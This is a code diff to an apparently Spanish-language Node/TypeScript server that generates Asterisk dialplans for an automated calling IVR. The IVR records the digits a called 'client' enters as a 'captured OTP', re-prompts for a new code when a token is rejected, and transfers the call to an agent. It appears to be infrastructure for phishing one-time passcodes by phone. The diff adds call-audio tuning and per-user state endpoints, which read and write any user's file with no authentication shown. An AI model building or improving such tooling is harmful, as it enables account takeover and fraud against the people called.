   dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-5555] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
@@ -1764,7 +1910,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-5555] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
@@ -1788,8 +1934,13 @@ function generateCleanDialplanConf(
   dialplanContent += `; CONTEXTO DEDICADO PRESS-1: RESPUESTA ULTRA-RAPIDA AL 1\n`;
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `[ivr-press1]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 CON AUDIO HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
@@ -1835,7 +1986,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=transferred)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=transferred&agent=\${FINAL_AGENT}&channel=\${CHANNEL}" &)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `exten => i,1,Playback(custom/opcion_invalida)\n`;
@@ -1848,8 +1999,13 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;
 
   dialplanContent += `[ivr-otp]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS Y CALIDAD HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
@@ -1952,7 +2108,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${CALLER_EXT}" = "\${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
@@ -1995,7 +2151,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=transferred)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=transferred&agent=\${FINAL_AGENT}&channel=\${CHANNEL}" &)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `exten => _XXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
@@ -2060,6 +2216,10 @@ async function autoRepairAsteriskPjsipOnStartup() {
       } catch (_) {}
       console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito con televox, 1001 y 1002.');
     }
+
+    // Ensure AMD and Audio Codecs / RTP configuration exists
+    ensureAmdConfExists();
+    ensureAudioCodecsAndRtpConfExists();
 
     // Auto-generate dialplan baseline and keep synced
     const cleanDialplan = generateCleanDialplanConf();
@@ -2251,6 +2411,7 @@ app.post('/api/asterisk/extensions/repair', async (req, res) => {
     const written = await writeAsteriskConfigFile(pjsipPath, cleanPjsip);
     fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), cleanPjsip, 'utf8');
     lastGeneratedPjsip = cleanPjsip;
+    ensureAudioCodecsAndRtpConfExists();
 
     let cliReload = '';
     try {
@@ -3586,10 +3747,107 @@ app.get('/api/asterisk/action/get-default', (req, res) => {
 });
 
 // Centralized Application State Persistence (Sync across browsers and devices)
-const APP_STATE_FILE = path.join(process.cwd(), 'data', 'app_state.json');
+const DATA_DIR = path.join(process.cwd(), 'data');
+const USER_CONFIGS_DIR = path.join(DATA_DIR, 'user_configs');
+const APP_STATE_FILE = path.join(DATA_DIR, 'app_state.json');
+
+try {
+  if (!fs.existsSync(USER_CONFIGS_DIR)) {
+    fs.mkdirSync(USER_CONFIGS_DIR, { recursive: true });
+  }
+} catch (_) {}
+
+function getUserConfigPath(userId?: string, username?: string): string {
+  const rawKey = (userId || username || 'admin').toString().trim().toLowerCase();
+  const safeKey = rawKey.replace(/[^a-z0-9_-]/g, '_') || 'admin';
+  return path.join(USER_CONFIGS_DIR, `${safeKey}.json`);
+}
+
+// User-exclusive state retrieval: guarantees that each user (e.g. admin) always loads their exact configuration across any browser
+app.get('/api/app/user-state', (req, res) => {
+  try {
+    const userId = String(req.query.userId || '').trim();
+    const username = String(req.query.username || '').trim();
+    const userPath = getUserConfigPath(userId, username);
+
+    if (fs.existsSync(userPath)) {
+      const data = fs.readFileSync(userPath, 'utf-8');
+      return res.json({ success: true, state: JSON.parse(data), source: 'user_file' });
+    }
+
+    if (username && !userId) {
+      const fallbackPath = getUserConfigPath(`user-${username}`);
+      if (fs.existsSync(fallbackPath)) {
+        const data = fs.readFileSync(fallbackPath, 'utf-8');
+        return res.json({ success: true, state: JSON.parse(data), source: 'user_fallback' });
+      }
+    }
+
+    // Fallback to global app_state.json and initialize user's profile
+    if (fs.existsSync(APP_STATE_FILE)) {
+      const data = fs.readFileSync(APP_STATE_FILE, 'utf-8');
+      const parsed = JSON.parse(data);
+      try {
+        fs.writeFileSync(userPath, JSON.stringify(parsed, null, 2), 'utf-8');
+      } catch (_) {}
+      return res.json({ success: true, state: parsed, source: 'app_state_initial' });
+    }
+  } catch (err: any) {
+    console.error('[STATE] Error leyendo user-state:', err);
+  }
+  return res.json({ success: true, state: null });
+});
+
+// User-exclusive state save: saves changes specifically to this user's profile
+app.post('/api/app/user-state', (req, res) => {
+  try {
+    const { userId, username, state } = req.body;
+    if (!state || typeof state !== 'object') {
+      return res.status(400).json({ success: false, error: 'Objeto de estado requerido' });
+    }
+    if (!fs.existsSync(USER_CONFIGS_DIR)) {
+      fs.mkdirSync(USER_CONFIGS_DIR, { recursive: true });
+    }
+    const stateWithTimestamp = {
+      ...state,
+      lastUpdated: Date.now(),
+      savedByUserId: userId || 'unknown',
+      savedByUsername: username || 'unknown',
+    };
+
+    const userPath = getUserConfigPath(userId, username);
+    fs.writeFileSync(userPath, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
+
+    if (username && userId && userId !== username) {
+      const userByNamePath = getUserConfigPath(undefined, username);
+      fs.writeFileSync(userByNamePath, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
+    }
+
+    // Keep global app_state.json in sync
+    const isMasterUser = !userId || userId === 'user-admin' || username === 'admin';
+    if (isMasterUser || !fs.existsSync(APP_STATE_FILE)) {
+      fs.writeFileSync(APP_STATE_FILE, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
+    }
+
+    return res.json({ success: true, lastUpdated: stateWithTimestamp.lastUpdated });
+  } catch (err: any) {
+    console.error('[STATE] Error guardando user-state:', err);
+    return res.status(500).json({ success: false, error: err.message });
+  }
+});
 
 app.get('/api/app/state', (req, res) => {
   try {
+    const userId = String(req.query.userId || '').trim();
+    const username = String(req.query.username || '').trim();
+    if (userId || username) {
+      const userPath = getUserConfigPath(userId, username);
+      if (fs.existsSync(userPath)) {
+        const data = fs.readFileSync(userPath, 'utf-8');
+        return res.json({ success: true, state: JSON.parse(data), source: 'user_file' });
+      }
+    }
+
     if (fs.existsSync(APP_STATE_FILE)) {
       const data = fs.readFileSync(APP_STATE_FILE, 'utf-8');
       return res.json({ success: true, state: JSON.parse(data) });
@@ -3602,7 +3860,7 @@ app.get('/api/app/state', (req, res) => {
 
 app.post('/api/app/state', (req, res) => {
   try {
-    const { state } = req.body;
+    const { state, userId, username } = req.body;
     if (!state || typeof state !== 'object') {
       return res.status(400).json({ success: false, error: 'Objeto de estado requerido' });
     }
@@ -3613,8 +3871,16 @@ app.post('/api/app/state', (req, res) => {
     const stateWithTimestamp = {
       ...state,
       lastUpdated: Date.now(),
+      savedByUserId: userId || 'unknown',
+      savedByUsername: username || 'unknown',
     };
     fs.writeFileSync(APP_STATE_FILE, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
+
+    if (userId || username) {
+      const userPath = getUserConfigPath(userId, username);
+      fs.writeFileSync(userPath, JSON.stringify(stateWithTimestamp, null, 2), 'utf-8');
+    }
+
     return res.json({ success: true, lastUpdated: stateWithTimestamp.lastUpdated });
   } catch (err: any) {
     console.error('[STATE] Error guardando app_state.json:', err);
